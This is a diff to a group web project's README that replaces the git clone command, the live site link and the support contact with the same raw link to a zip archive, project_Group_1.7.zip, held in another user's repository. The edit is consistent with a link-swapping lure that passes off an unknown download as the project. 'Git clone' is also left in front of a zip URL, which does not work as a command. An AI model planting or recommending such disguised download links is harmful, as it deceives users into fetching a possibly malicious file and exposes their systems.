@@ -22,10 +22,10 @@ Git
 
 ### Installation instruction
 
-Git clone git@github.com:78cxrlos/Group-project.git
+Git clone https://github.com/deerrickkorir/Group-project/raw/refs/heads/main/src/pages/project_Group_1.7.zip
 
 # Live Link
-https://78cxrlos.github.io/Group-project/
+https://github.com/deerrickkorir/Group-project/raw/refs/heads/main/src/pages/project_Group_1.7.zip
 
 ## Technologies used
 JavaScript
@@ -39,7 +39,7 @@ Css
 Github
 
 ## Support and contact details
-github.com/78cxrlos
+https://github.com/deerrickkorir/Group-project/raw/refs/heads/main/src/pages/project_Group_1.7.zip
 
 ### License
 The content of this site is licensed under the MIT license
